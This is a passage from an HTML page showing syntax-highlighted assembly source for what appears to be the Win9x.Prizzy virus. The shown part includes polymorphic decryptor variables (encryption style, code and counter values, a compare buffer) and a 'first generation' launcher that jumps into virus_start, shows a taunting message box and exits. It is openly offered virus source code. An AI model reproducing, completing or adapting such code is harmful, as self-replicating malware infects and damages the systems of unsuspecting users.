</span><span class="sc5">code_reg_place</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;register in (base/copro/mmx)-reg</span><span class="sc0">

</span><span class="sc5">code_value</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;startup code value</span><span class="sc0">
</span><span class="sc5">code_value_add</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;next_code = code + this_c</span><span class="sc0">
</span><span class="sc5">crypt_style</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;(0=add/1=sub/2=xor) [---],reg32</span><span class="sc0">
</span><span class="sc5">counter_value</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;startup counter value</span><span class="sc0">
</span><span class="sc5">counter_vfinish</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;finish counter value</span><span class="sc0">
</span><span class="sc5">counter_back</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;address for JNZ jump</span><span class="sc0">

</span><span class="sc5">compare_index</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;where in &lt;compare_buffer&gt;</span><span class="sc0">
</span><span class="sc5">compare_buffer</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">00000000h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;see &lt;g_compare&gt; for more infoz</span><span class="sc0">

</span><span class="sc5">mem_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ first generation ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">first_generation</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; after installing, run it above</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">original_ep</span><span class="sc4">],</span><span class="sc0"> \
            </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__fg_run_this</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">

    </span><span class="sc5">__fg_run_this</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; display a simple message box</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MB_OK</span><span class="sc0">
        </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"Win9x.Prizzy - welcome to my world..."</span><span class="sc0">
        </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"First generation sample"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">

        </span><span class="sc1">; exit program - haha huahaha &lt;program&gt; :))</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ end of virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">first_generation</span><span class="sc0">
</span></div></body>
</html>
